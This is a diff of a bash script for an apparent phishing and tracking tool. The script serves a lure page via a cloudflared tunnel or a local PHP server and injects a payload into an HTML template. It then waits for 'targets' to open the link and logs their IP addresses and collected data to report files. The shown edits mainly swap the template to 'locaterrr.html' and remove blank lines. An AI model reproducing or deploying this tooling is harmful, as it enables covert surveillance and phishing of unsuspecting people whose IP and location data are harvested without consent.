@@ -21,7 +21,6 @@ printf "\n"
 
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
-
 }
 
 stop() {
@@ -42,21 +41,16 @@ exit 1
 }
 
 catch_ip() {
-
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 cat ip.txt >> saved.ip.txt
-
 }
 
 checkfound() {
-
 printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
-
-
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
@@ -67,9 +61,7 @@ sleep 0.5
 done 
 }
 
-
 cf_server() {
-
 if [[ -e cloudflared ]]; then
 echo "Cloudflared already installed."
 else
@@ -102,17 +94,18 @@ exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
-sed 's+forwarding_link+'$link'+g' template.php > index.php
+sed 's+forwarding_link+'$link'+g' locaterrr.html > index.html  # Use locaterrr.html here
 checkfound
 }
 
 local_server() {
-sed 's+forwarding_link+''+g' template.php > index.php
+sed 's+forwarding_link+''+g' locaterrr.html > index.html  # Use locaterrr.html here
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
 php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
 sleep 2
 checkfound
 }
+
 hound() {
 if [[ -e data.txt ]]; then
 cat data.txt >> targetreport.txt
@@ -122,7 +115,7 @@ fi
 if [[ -e ip.txt ]]; then
 rm -rf ip.txt
 fi
-sed -e '/tc_payload/r payload' locaterrr.html > locaterrr.html
+sed -e '/tc_payload/r payload' locaterrr.html > index.html  # Use locaterrr.html here
 default_option_server="Y"
 read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
